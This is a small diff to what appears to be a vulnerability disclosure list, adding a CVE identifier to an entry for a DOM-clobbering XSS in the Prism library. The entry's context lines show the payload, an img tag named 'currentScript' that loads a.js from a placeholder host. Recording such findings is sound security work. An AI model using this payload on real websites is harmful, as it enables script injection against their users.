@@ -8,7 +8,7 @@
 + Fingerprint: `typeof window.Prism !== 'undefined'`
 + Payload: ```<img name="currentScript" src="https://xxx.xxx.xxx/a.js"></img>```
 + Impact: XSS
-+ CVE: N/A
++ CVE: CVE-2024-53382
 + Status: Reported
 + Foundby: TheHulk
 
